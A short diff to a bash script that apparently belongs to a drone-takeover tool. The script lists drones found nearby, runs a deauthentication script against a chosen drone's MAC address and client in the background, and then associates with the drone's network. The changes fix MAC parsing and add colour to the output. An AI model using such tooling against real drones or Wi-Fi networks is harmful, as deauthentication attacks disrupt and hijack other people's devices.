@@ -3,6 +3,7 @@
 RED='\033[1;31m'
 YELLOW='\033[1;33m'
 GREEN='\033[1;32m'
+BLUE='\033[1;34m'
 NO_COLOR='\033[0m'
 
 ./toManagedMode.sh
@@ -19,7 +20,7 @@ else
 	for (( i=1; i<=$NUM_DRONES*4; i+=4 ))
 	do
 		ESSID="`grep -n essid .dronesFound.txt | grep "$i:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`"
-		MAC="`grep -n bssid .dronesFound.txt | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`"
+		MAC="`grep -n bssid .dronesFound.txt | grep "$[$i+1]:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`"
 		echo -e "\t$LIST_NUM: $ESSID ($MAC)"
 		LIST_NUM=`expr $LIST_NUM + 1`
 	done
@@ -41,7 +42,7 @@ else
 		MON_INT=`cat .ints.txt | cut -d " " -f 2 `
 		./deauth.sh $MON_INT $TARGET_MAC $CLIENT >> /dev/null &
 		RPID=$!
-		echo "RPID: $RPID"
+		echo "RPID: ${BLUE}$RPID${NO_COLOR}"
 	fi
 
 	echo -e "Associating with ${GREEN}$TARGET_ESSID${NO_COLOR} over ${YELLOW}$INT${NO_COLOR}"
